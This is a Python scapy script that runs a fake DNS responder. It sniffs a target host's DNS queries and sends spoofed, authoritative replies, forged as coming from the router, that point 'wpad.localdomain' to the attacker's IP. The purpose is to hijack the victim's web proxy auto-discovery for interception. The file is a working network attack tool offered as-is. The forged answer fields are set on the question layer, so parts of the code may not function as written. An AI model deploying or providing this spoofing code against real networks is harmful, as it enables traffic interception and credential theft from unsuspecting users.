from termcolor import cprint
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sniff, send
from scapy.arch import conf


def __poison_response(pkt):
    original_qname = pkt[DNSQR].qname
    if WPAD_HOSTNAME in str(original_qname):
        fake_dns_pkt = IP()/UDP()/DNS()/DNSQR()

        fake_dns_pkt[IP].src = ROUTER_IP
        fake_dns_pkt[IP].dst = TARGET_IP

        fake_dns_pkt[UDP].sport = 53
        fake_dns_pkt[UDP].dport = pkt[UDP].sport

        fake_dns_pkt[DNS].id = pkt[DNS].id
        fake_dns_pkt[DNS].qd = pkt[DNS].qd
        fake_dns_pkt[DNS].aa = 1
        fake_dns_pkt[DNS].qr = 1
        fake_dns_pkt[DNS].ancount = 1

        fake_dns_pkt[DNSQR].qname = WPAD_HOSTNAME + '.'
        fake_dns_pkt[DNSQR].rrname = WPAD_HOSTNAME + '.'
        fake_dns_pkt[DNSQR].rdata = ATTACKER_IP

        cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
        send(fake_dns_pkt, verbose=0)

def run(router_ip, target_ip, interface):
    global ATTACKER_IP
    global ROUTER_IP
    global TARGET_IP
    global WPAD_HOSTNAME

    ATTACKER_IP = conf.ifaces[interface].ip
    ROUTER_IP = router_ip
    TARGET_IP = target_ip
    WPAD_HOSTNAME = 'wpad.localdomain'

    cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])

    bpf_filter = f'udp dst port 53 and not src host {ATTACKER_IP} and src host {TARGET_IP}'

    sniff(prn=__poison_response, filter=bpf_filter, iface=interface)